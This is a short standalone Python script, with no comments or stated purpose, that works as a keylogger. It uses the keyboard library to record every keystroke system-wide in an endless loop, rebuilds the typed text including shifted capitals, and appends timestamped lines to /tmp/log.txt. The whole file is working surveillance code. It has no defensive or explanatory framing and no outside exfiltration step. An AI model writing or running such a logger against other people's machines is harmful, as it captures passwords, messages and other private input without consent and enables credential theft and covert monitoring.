#!/usr/bin/env python3
import keyboard
from datetime import datetime
from typing import List

with open("/tmp/log.txt", "a") as f:
    data = ""
    while True:
        events: List[keyboard.KeyboardEvent] = keyboard.record(until='enter')
        capitalized: bool = False
        output: str = ""
        for e in events:
            if e.name == 'shift':
                capitalized = True if e.event_type == keyboard._keyboard_event.KEY_DOWN else False
                continue
            if capitalized and e.event_type == keyboard._keyboard_event.KEY_DOWN:
                e.name = e.name.upper()
            output += e.name[0] if e.event_type == keyboard._keyboard_event.KEY_DOWN else ""
        
        data += output
        
        f.write(f"{datetime.now()}: ")
        f.write(output[:-1])
        f.write("\n")
        f.flush()
